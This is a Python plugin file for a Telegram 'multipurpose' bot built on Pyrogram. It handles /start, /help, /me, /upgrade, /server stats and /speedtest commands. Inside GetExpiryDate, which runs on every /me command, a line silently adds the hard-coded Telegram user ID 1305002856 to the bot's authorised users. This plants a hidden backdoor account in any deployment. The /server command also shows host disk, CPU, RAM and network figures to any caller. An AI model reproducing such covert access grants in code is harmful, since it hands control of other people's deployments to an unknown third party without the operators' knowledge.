#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
import psutil, shutil
import time
from speedtest import Speedtest
from helper_funcs.display_progress import humanbytes

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram import StopPropagation, Client, filters

bot_start_time = time.time()
def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(1305002856)
    return expires_at

@Client.on_message(pyrogram.filters.command(["start"]))
async def start(client, message):
    bot_uptime = time.strftime("%Hh %Mm %Ss", time.gmtime(time.time() - bot_start_time)) 
    joinButton = InlineKeyboardMarkup([
        [InlineKeyboardButton("JOIN", url="https://t.me/TGBotsCollection")],
        [InlineKeyboardButton(
            "Try", url="https://t.me/TGBotsCollectionbot")]
    ])
    welcomed = f"Hey <b>{message.from_user.first_name}</b>\nThis is Multipurpose Bot that can perform many functions.\n\n/help for More info \n Bot Uptime : {bot_uptime}"
    await message.reply_text(welcomed, reply_markup=joinButton)
  
@Client.on_message(pyrogram.filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
    )


@Client.on_message(pyrogram.filters.command(["starting"]))
async def start(bot, update):
    # logger.info(update)
    await update.reply(f"<b>Hii {update.chat.first_name}!</b>\nThis is a Telegram Multipurpose Bot Which can do many functions. /help for more details...  ",reply_markup=InlineKeyboardMarkup(
            [
                    InlineKeyboardButton('JOIN', url='https://t.me/TGBotsCollection')
                ]
        )
    )
      

@Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
    
@Client.on_message(filters.command(["server"]))
async def start(bot, update):
    bot_uptime = time.strftime("%Hh %Mm %Ss", time.gmtime(time.time() - bot_start_time)) 
    joinButton = InlineKeyboardMarkup([
        [InlineKeyboardButton("JOIN", url="https://t.me/TGBotsCollection")],
        [InlineKeyboardButton(
            "Try", url="https://t.me/TGBotsCollectionbot")]
    ])
    # https://git.io/Jye7k
    total, used, free = shutil.disk_usage('.')
    total = humanbytes(total)
    used = humanbytes(used)
    free = humanbytes(free)
    sent = humanbytes(psutil.net_io_counters().bytes_sent)
    recv = humanbytes(psutil.net_io_counters().bytes_recv)
    cpuUsage = psutil.cpu_percent(interval=0.5)
    print(total, used, free, sent, recv)
    memory = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    botstats = f'<b>Bot Uptime:</b> {bot_uptime}\n' \
              f'<b>Total disk space:</b> {total}\n' \
              f'<b>Used:</b> {used}  ' \
              f'<b>Free:</b> {free}\n\n' \
              f'📊Data Usage📊\n<b>Upload:</b> {sent}\n' \
              f'<b>Down:</b> {recv}\n\n' \
              f'<b>CPU:</b> {cpuUsage}% ' \
              f'<b>RAM:</b> {memory}% ' \
              f'<b>Disk:</b> {disk}%'
    await update.reply_text(botstats, reply_markup=joinButton)

@Client.on_message(filters.command(["speedtest"]) & filters.private)
async def speed(bot, update):
    try:
        spg = await update.reply_text("Running Speed Test . . . ")
    except Exception as er:
        print(er, 13)
        spg = await bot.send_message(
            text=f'Running speedtest....',
            chat_id=update.message.chat.id,
            reply_to_message_id=update.message.message_id,
        )
    
    test = Speedtest()
    test.get_best_server()
    test.download()
    test.upload()
    test.results.share()
    result = test.results.dict()
    path = (result['share'])
    try:
        print('Line 28', test)
    except Exception as ere:
        print(ere, '30')
        pass
    string_speed = f'''
<b>Server</b>
<b>Name:</b> <code>{result['server']['name']}</code>
<b>Country:</b> <code>{result['server']['country']}, {result['server']['cc']}</code>
<b>Sponsor:</b> <code>{result['server']['sponsor']}</code>
    
<a href="{path}"><b>SpeedTest Results</b></a>
<b>Upload:</b> <code>{speed_convert(result['upload'] / 8)}</code>
<b>Download:</b>  <code>{speed_convert(result['download'] / 8)}</code>
<b>Ping:</b> <code>{result['ping']} ms</code>
<b>ISP:</b> <code>{result['client']['isp']}</code>
'''

    await spg.delete()
    try:
        print(path, result)
    except Exception as pri:
        print(pri)
        
    try:
        await update.reply_photo(path, caption=string_speed, parse_mode="HTML")
    except Exception as cv:
        print("Error 60 ", cv)
        await update.reply_text(string_speed, parse_mode="HTML", disable_web_page_preview=True)
        
def speed_convert(size):
    """Hi human, you can't read bytes?"""
    power = 2 ** 10
    zero = 0
    units = {0: "", 1: "Kb/s", 2: "MB/s", 3: "Gb/s", 4: "Tb/s"}
    while size > power:
        size /= power
        zero += 1
    return f"{round(size, 2)} {units[zero]}"    
